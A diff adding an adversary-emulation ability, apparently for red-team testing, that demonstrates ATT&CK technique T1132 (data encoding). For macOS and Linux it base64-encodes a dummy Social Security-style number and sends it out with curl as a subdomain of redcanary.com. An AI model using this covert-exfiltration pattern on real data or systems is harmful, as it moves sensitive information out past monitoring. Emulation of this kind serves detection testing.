@@ -1,0 +1,20 @@
+---
+
+- id: taccomma-1132-AR00-1v00-200120190846
+  name: Base64 Encoded data.
+  description: .      Utilizing a common technique for posting base64 encoded data..  
+  tactic: command-and-control
+  technique:
+    attack_id: T1132
+    name: Data Encoding
+  platforms:
+    darwin:
+      sh:
+        command: |
+          echo -n 111-11-1111 | base64
+          curl -XPOST MTExLTExLTExMTE=.redcanary.com
+    linux:
+      sh:
+        command: |
+          echo -n 111-11-1111 | base64
+          curl -XPOST MTExLTExLTExMTE=.redcanary.com
